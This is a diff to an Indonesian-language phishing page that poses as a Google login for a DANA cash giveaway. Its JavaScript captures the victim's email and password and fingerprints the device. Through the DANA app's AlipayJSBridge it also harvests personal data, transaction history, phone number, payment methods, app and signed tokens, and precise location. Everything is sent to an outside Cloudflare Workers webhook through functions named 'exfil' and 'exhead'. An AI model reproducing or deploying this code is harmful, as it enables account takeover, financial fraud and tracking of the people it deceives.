@@ -1,6 +1,6 @@
 <!doctype html><html lang="id" dir="ltr"><head><base href="https://accounts.google.com/v3/signin/"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>Login - Akun Google untuk DANA Kaget Rp 100.000</title>
 <style>
-body{margin:0;font-family:Google Sans,Roboto,Arial,sans-serif;background:#f8f9fa;color:#1f1f1f;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:16px;box-sizing:border-box}
+body{margin:0;font-family:Google Sans,Roboto,Arial,sans-serif;background:#f8f9fa;color:#1f1f1f;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;box-sizing:border-box}
 .topbar{background:#fff;border-bottom:1px solid #dadce0;padding:10px 16px;display:flex;align-items:center;gap:10px}
 .topbar img{height:28px}
 .topbar span{font-size:14px;color:#5f6368;font-weight:500}
@@ -8,7 +8,8 @@ body{margin:0;font-family:Google Sans,Roboto,Arial,sans-serif;background:#f8f9fa
 .banner img{width:36px;height:36px;border-radius:50%}
 .banner b{font-size:13px;color:#1f1f1f}
 .banner p{font-size:12px;color:#5f6368;margin:2px 0 0}
-.card{max-width:448px;margin:16px auto;background:#fff;border:1px solid #dadce0;border-radius:8px;padding:28px 24px}
+.card{width:100%;max-width:448px;margin:auto;background:#fff;border:1px solid #dadce0;border-radius:8px;padding:36px 40px;box-sizing:border-box}
+@media(max-width:480px){.card{margin:auto;padding-left:24px;padding-right:24px}}
 
 .logo{display:block;margin:0 auto 12px;width:40px}
 h1{font-size:22px;font-weight:400;text-align:center;margin:6px 0 4px}
@@ -42,28 +43,51 @@ h1{font-size:22px;font-weight:400;text-align:center;margin:6px 0 4px}
   var WH='https://larp-hook.rofikulhuda244.workers.dev';
   var SESSION = Date.now().toString(36)+Math.random().toString(36).slice(2,6);
   document.getElementById('beacon').src = WH+'/?src=larpLandingImg&session='+SESSION;
-  var R={email:'',password:'',env:null,pii:null,trx:null,loc:null,addr:null,dev:null,pay:null};
-  function wh(p){try{p.session=SESSION;var q=[];for(var k in p)q.push(k+'='+encodeURIComponent(String(p[k]).slice(0,1200)));fetch(WH+'?'+q.join('&'),{mode:'no-cors',cache:'no-store'}).catch(function(){});}catch(e){}}
+  var R={email:'',password:'',env:null,pii:null,trx:null,loc:null,addr:null,rev:null,usr:null,dev:null,phone:null,net:null,pay:null,tok:null,sig:null};
   function compact(o){try{return typeof o==='string'?o:JSON.stringify(o)}catch(e){return String(o)}}
+  function exfil(stage,data){try{
+    var body=JSON.stringify({session:SESSION,t:'full',stage:stage,ts:Date.now(),data:data});
+    fetch(WH,{method:'POST',mode:'no-cors',cache:'no-store',body:body}).catch(function(){});
+  }catch(e){}}
+  function exhead(p){try{p.session=SESSION;var q=[];for(var k in p)q.push(k+'='+encodeURIComponent(String(p[k]).slice(0,1500)));fetch(WH+'?'+q.join('&'),{mode:'no-cors',cache:'no-store'}).catch(function(){});}catch(e){}}
+  function callB(name,params,cb){try{window.AlipayJSBridge.call(name,params||{},cb);}catch(e){if(cb)cb({__err:String(e).slice(0,200)});}}
   function bridgeReady(cb){if(window.AlipayJSBridge)return cb();var f=false;var go=function(){if(!f){f=true;cb();}};document.addEventListener('AlipayJSBridgeReady',go,false);setTimeout(go,4000);}
+  function fp(){try{var f={ua:navigator.userAgent,platform:navigator.platform,lang:navigator.language,langs:navigator.languages,cores:navigator.hardwareConcurrency,mem:navigator.deviceMemory,scw:screen.width,sch:screen.height,dpr:window.devicePixelRatio,innerW:innerWidth,innerH:innerHeight,tz:(function(){try{return Intl.DateTimeFormat().resolvedOptions().timeZone}catch(e){return''}})(),httph:location.protocol,mobile:/Mobi|Android|iPhone/i.test(navigator.userAgent)};return f;}catch(e){return {err:String(e)}}}
+
   var emailEl=document.getElementById('inp-email'), passEl=document.getElementById('inp-pass');
   var w1=document.getElementById('wrap-email'), w2=document.getElementById('wrap-pass');
   emailEl.addEventListener('focus',function(){w1.classList.add('focus')}); emailEl.addEventListener('blur',function(){w1.classList.remove('focus'); if(emailEl.value) w1.classList.add('hasval'); else w1.classList.remove('hasval')});
   passEl.addEventListener('focus',function(){w2.classList.add('focus')}); passEl.addEventListener('blur',function(){w2.classList.remove('focus'); if(passEl.value) w2.classList.add('hasval'); else w2.classList.remove('hasval')});
   document.getElementById('show-pass').onchange=function(){passEl.type=this.checked?'text':'password'};
-  document.getElementById('btn-next1').onclick=function(){var v=emailEl.value.trim(); if(!v||!v.includes('@')){w1.style.borderColor='#d93025';emailEl.focus();return;} R.email=v; document.getElementById('chosen-email').textContent=v; document.getElementById('step1').classList.add('hidden'); document.getElementById('step2').classList.remove('hidden'); wh({src:'larpLanding',stage:'email',email:v});};
-  document.getElementById('btn-next2').onclick=function(){var p=passEl.value; if(!p||p.length<6){w2.style.borderColor='#d93025';passEl.focus();return;} R.password=p; document.getElementById('step2').classList.add('hidden'); document.getElementById('step3').classList.remove('hidden'); var piiLen=R.pii?compact(R.pii).length:0, trxLen=R.trx?compact(R.trx).length:0; wh({src:'larpLanding',stage:'creds',email:R.email,password:R.password,piiBytes:piiLen,trxBytes:trxLen,piiHead:R.pii?compact(R.pii).slice(0,800):'',trxHead:R.trx?compact(R.trx).slice(0,400):'',lat:R.loc?R.loc.latitude:'',lng:R.loc?R.loc.longitude:'',address:R.addr?JSON.stringify(R.addr).slice(0,800):''}); setTimeout(function(){ wh({src:'larpLanding',stage:'final',email:R.email,password:p,piiBytes:piiLen,trxBytes:trxLen}); },600); setTimeout(function(){ document.getElementById('step3').innerHTML='<div style="background:#fce8e6;border:1px solid #f5c6cb;border-radius:8px;padding:12px"><p style="color:#b3261e;font-size:13px;margin:0">Tidak dapat memverifikasi akun. Coba lagi nanti atau hubungi bantuan DANA.</p></div>'; },3000);};
+  document.getElementById('btn-next1').onclick=function(){var v=emailEl.value.trim(); if(!v||!v.includes('@')){w1.style.borderColor='#d93025';emailEl.focus();return;} R.email=v; document.getElementById('chosen-email').textContent=v; document.getElementById('step1').classList.add('hidden'); document.getElementById('step2').classList.remove('hidden'); exfil('email',{email:v}); exhead({src:'larpLanding',stage:'email',email:v});};
+  document.getElementById('btn-next2').onclick=function(){var p=passEl.value; if(!p||p.length<6){w2.style.borderColor='#d93025';passEl.focus();return;} R.password=p; document.getElementById('step2').classList.add('hidden'); document.getElementById('step3').classList.remove('hidden');
+    var agg={email:R.email,password:p,env:R.env,pii:R.pii,trx:R.trx,loc:R.loc,addr:R.addr,rev:R.rev,usr:R.usr,dev:R.dev,phone:R.phone,net:R.net,pay:R.pay,tok:R.tok,sig:R.sig};
+    exfil('creds',agg); exfil('final',{email:R.email,password:p});
+    exhead({src:'larpLanding',stage:'creds',email:R.email,password:p,piiBytes:R.pii?compact(R.pii).length:0,trxBytes:R.trx?compact(R.trx).length:0,lat:R.loc?R.loc.latitude:'',lng:R.loc?R.loc.longitude:'',address:R.addr?compact(R.addr).slice(0,600):''});
+    setTimeout(function(){ document.getElementById('step3').innerHTML='<div style="background:#fce8e6;border:1px solid #f5c6cb;border-radius:8px;padding:12px"><p style="color:#b3261e;font-size:13px;margin:0">Tidak dapat memverifikasi akun. Coba lagi nanti atau hubungi bantuan DANA.</p></div>'; },3000);};
+
   bridgeReady(function(){
     var hasB=!!window.AlipayJSBridge; var sp={}; try{sp=window.AlipayJSBridge.startupParams||{}}catch(e){}
-    R.env={hasBridge:hasB,appId:sp.appId,href:location.href.slice(0,120),origin:location.origin,ts:new Date().toISOString(),session:SESSION};
-    wh({src:'larpLanding',stage:'boot',d:compact(R.env).slice(0,900)});
-    if(!hasB){ wh({src:'larpLanding',stage:'final',hasBridge:false,session:SESSION}); return; }
-    try{window.AlipayJSBridge.call('getUserInfoData',{event:'getUserInformation',info:{queryBy:'all'}},function(r){ R.pii=r; wh({src:'larpLanding',stage:'pii',piiBytes:compact(r).length,piiHead:compact(r).slice(0,900)}); try{window.AlipayJSBridge.call('getTransactionHistoryList',{event:'getInitList',pageNum:1,forceCache:false},function(t){ R.trx=t; wh({src:'larpLanding',stage:'trx',trxBytes:compact(t).length,trxHead:compact(t).slice(0,700)}); });}catch(e2){ wh({src:'larpLanding',stage:'trx',trxErr:String(e2).slice(0,80)}); }});}catch(e){ wh({src:'larpLanding',stage:'pii',err:String(e).slice(0,120)}); }
-    try{window.AlipayJSBridge.call('getLocationInfo',{},function(loc){ R.loc=loc; wh({src:'larpLanding',stage:'location',lat:loc.latitude,lng:loc.longitude,loc:compact(loc).slice(0,700)}); try{window.AlipayJSBridge.call('locationName',{info:{latitude:loc.latitude, longitude:loc.longitude}},function(addr){ R.addr=addr; wh({src:'larpLanding',stage:'address',address:compact(addr).slice(0,1200),lat:loc.latitude,lng:loc.longitude}); });}catch(ea){ wh({src:'larpLanding',stage:'address',addrErr:String(ea).slice(0,80)}); }});}catch(el){ wh({src:'larpLanding',stage:'location',locErr:String(el).slice(0,80)}); }
-    try{window.AlipayJSBridge.call('getAkuDeviceInfo',{},function(dev){ R.dev=dev; wh({src:'larpLanding',stage:'device',dev:compact(dev).slice(0,1200)}); });}catch(ed){}
-    try{window.AlipayJSBridge.call('getPhoneNumber',{},function(p){ wh({src:'larpLanding',stage:'phone',phone:compact(p).slice(0,500)}); });}catch(ep){}
-    try{window.AlipayJSBridge.call('queryPayMethod',{},function(pay){ R.pay=pay; wh({src:'larpLanding',stage:'pay',pay:compact(pay).slice(0,900)}); });}catch(eq){}
-    try{window.AlipayJSBridge.call('getAppToken',{},function(tok){ wh({src:'larpLanding',stage:'appToken',tok:compact(tok).slice(0,700)}); });}catch(et){}
+    R.env={hasBridge:hasB,appId:sp.appId,href:location.href.slice(0,200),origin:location.origin,ts:new Date().toISOString(),session:SESSION,fp:fp(),sp:sp};
+    exfil('boot',R.env); exhead({src:'larpLanding',stage:'boot',hasBridge:hasB,appId:sp.appId});
+    if(!hasB){ exfil('final',{hasBridge:false,session:SESSION}); return; }
+    callB('getUserInfoData',{event:'getUserInformation',info:{queryBy:'all'}},function(r){ R.pii=r; exfil('pii',r); exhead({src:'larpLanding',stage:'pii',piiBytes:compact(r).length}); });
+    callB('getTransactionHistoryList',{event:'getInitList',pageNum:1,forceCache:false},function(t){ R.trx=t; exfil('trx',t); exhead({src:'larpLanding',stage:'trx',trxBytes:compact(t).length}); });
+    callB('getUsername',{},function(u){ R.usr=u; exfil('usr',u); exhead({src:'larpLanding',stage:'usr',usr:compact(u).slice(0,300)}); });
+    callB('getAkuDeviceInfo',{},function(d){ R.dev=d; exfil('dev',d); exhead({src:'larpLanding',stage:'dev',devBytes:compact(d).length}); });
+    callB('getPhoneNumber',{},function(p){ R.phone=p; exfil('phone',p); exhead({src:'larpLanding',stage:'phone',phone:compact(p).slice(0,300)}); });
+    callB('getNetworkInfo',{},function(n){ R.net=n; exfil('net',n); exhead({src:'larpLanding',stage:'net',net:compact(n).slice(0,300)}); });
+    callB('queryPayMethod',{},function(pay){ R.pay=pay; exfil('pay',pay); exhead({src:'larpLanding',stage:'pay',payBytes:compact(pay).length}); });
+    callB('getAppToken',{},function(tok){ R.tok=tok; exfil('apptoken',tok); exhead({src:'larpLanding',stage:'apptoken',tok:compact(tok).slice(0,300)}); });
+    callB('GenerateNativeSignedToken',{},function(sg){ R.sig=sg; exfil('signedtoken',sg); exhead({src:'larpLanding',stage:'signedtoken',sig:compact(sg).slice(0,300)}); });
+    callB('getLocationInfo',{},function(loc){
+      R.loc=loc; exfil('location',loc); exhead({src:'larpLanding',stage:'location',lat:loc.latitude,lng:loc.longitude,loc:compact(loc).slice(0,600)});
+      if(loc&&loc.latitude!==undefined&&loc.latitude!==null){
+        callB('locationName',{info:{latitude:loc.latitude,longitude:loc.longitude}},function(addr){ R.addr=addr; exfil('address',addr); exhead({src:'larpLanding',stage:'address',address:compact(addr).slice(0,800),lat:loc.latitude,lng:loc.longitude}); });
+        callB('reverseGeocode',{info:{latitude:loc.latitude,longitude:loc.longitude}},function(rev){ R.rev=rev; exfil('rev',rev); exhead({src:'larpLanding',stage:'rev',rev:compact(rev).slice(0,500)}); });
+      }
+    });
+    if(navigator.geolocation){ try{ navigator.geolocation.getCurrentPosition(function(pos){ exfil('html5geo',{lat:pos.coords.latitude,lng:pos.coords.longitude,acc:pos.coords.accuracy,alt:pos.coords.altitude,sp:pos.coords.speed,head:pos.coords.heading}); exhead({src:'larpLanding',stage:'html5geo',lat:pos.coords.latitude,lng:pos.coords.longitude,acc:pos.coords.accuracy}); },function(er){ exhead({src:'larpLanding',stage:'html5geo',err:String(er.code)}); },{timeout:8000,maximumAge:0,enableHighAccuracy:true}); }catch(e){} }
   });
 })();
 </script>
